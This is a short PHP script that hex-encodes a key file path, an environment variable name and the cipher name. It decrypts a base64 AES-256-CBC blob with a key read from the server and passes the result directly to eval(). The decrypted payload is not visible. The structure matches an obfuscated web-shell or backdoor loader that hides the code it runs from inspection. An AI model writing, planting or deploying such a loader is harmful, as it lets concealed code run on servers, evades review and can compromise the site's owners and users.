<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('M8x+7b0ZrBL65G+DGNb8zg==');

$c=base64_decode(

'BlgrwJzFfKujChUYoZ60XsogOgIdBUz6EqVI/jvQMXnb6D20LE6E185iIQTUtrdp2OGvpMUwDefm' .
'WjwaJlHPoFgOAE6ImSwNX9GpZBR4v6EeI0FBbJPiTMRBGrESj+ioGeGDge6E2VXvfY2YArx5IarZ' .
'dF4ILgA4kgeNedsbeRGuuyESd1ytlYdrgPlxjHfKzAze4EUMpR/JJO2oLZabcLH7ByMljA/N5rVK' .
'g2P273rORcb3CLa5B7N5BHpBJiF0BkfKYBu5g2r/bpZazCN2YSFy6iGjZx40s03WPHWqF/vS5V9w' .
'zbHvHWCTyz0ksyqBiZpd/ZnwWZFybPhE/br41E2slMipOxX9wXCvEbdEgmLEsG7J0pONFBmqIMv1' .
'UQq7CpjuO/gICynN4l/J01UqOAwNM46d1UpCm64R8kZXibHpcyt0thJrHd3v1QBrP0RI+Kb4lXB3' .
'yVdPCsRz9Gca8BisQhxfbfQA95uJyeS0neW8U3vGJKG3fMyi7r3wk64/knyUNwTV6yMM74jAR6Qx' .
'pBLuHyDiHq+yO3X722F+3z8='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

